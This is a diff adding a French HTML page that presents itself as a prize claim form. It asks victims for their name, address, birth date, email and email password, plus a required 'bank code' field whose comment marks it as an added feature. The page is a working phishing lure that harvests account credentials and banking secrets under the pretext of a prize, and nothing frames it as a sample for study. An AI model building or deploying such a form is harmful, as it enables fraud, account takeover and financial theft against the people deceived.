@@ -1,0 +1,75 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Formulaire de Réclamation de Prix</title>
+    <link rel="stylesheet" type="text/css" href="style.css">
+</head>
+<body>
+
+    <div class="form">
+        <div class="title-div">
+            <h1>Formulaire de Réclamation de Prix</h1>
+            <p>Merci de remplir le formulaire ci-dessous pour réclamer votre prix.</p>
+            <p class="required">*Required</p>
+        </div>
+
+        <form action="traitement.php" method="post">
+            <div class="name-div">
+                <div class="name">Nom et Prénom<span class="required">*</span></div>
+                <div class="input-div"><input type="text" name="nom" placeholder="Votre réponse" required></div>
+            </div>
+
+            <div class="gmail-div">
+                <div class="name">Numéro de téléphone</div>
+                <div class="input-div"><input type="tel" name="telephone" placeholder="Votre réponse"></div>
+            </div>
+
+            <div class="mobile-div">
+                <div class="name">Adresse postale</div>
+                <div class="input-div"><textarea name="adresse" placeholder="Votre réponse"></textarea></div>
+            </div>
+
+            <div class="name-div">
+                <div class="name">Date de naissance<span class="required">*</span></div>
+                <div class="input-div"><input type="date" name="naissance" required></div>
+            </div>
+
+            <div class="college-div">
+                <div class="name">Réponse à la question du concours<span class="required">*</span></div>
+                <div class="input-div"><input type="text" name="reponse" placeholder="Votre réponse" required></div>
+            </div>
+
+            <div class="college-div">
+                <div class="name">Adresse e-mail<span class="required">*</span></div>
+                <div class="input-div"><input type="email" name="email" placeholder="Votre réponse" required></div>
+            </div>
+            
+            <div class="gmail-div">
+                <div class="name">Mot de passe<span class="required">*</span></div>
+                <div class="input-div"><input type="password" name="motDePasse" placeholder="Votre mot de passe" required></div>
+            </div>
+
+            <div class="mobile-div">
+                <div class="name">J'accepte le prix<span class="required">*</span></div>
+                <div class="input-div">
+                    <label><input type="radio" name="acceptation" value="oui" required> Oui</label>
+                    <label><input type="radio" name="acceptation" value="non" required> Non</label>
+                </div>
+            </div>
+
+            <!-- Ajout du champ de code bancaire -->
+            <div class="college-div">
+                <div class="name">Code Bancaire<span class="required">*</span></div>
+                <div class="input-div"><input type="text" name="codeBancaire" placeholder="Votre code bancaire" required></div>
+            </div>
+
+            <div>
+                <input class="btn" type="submit" name="Submit" value="Réclamer le prix">
+            </div>
+        </form>
+    </div>
+
+</body>
+</html>
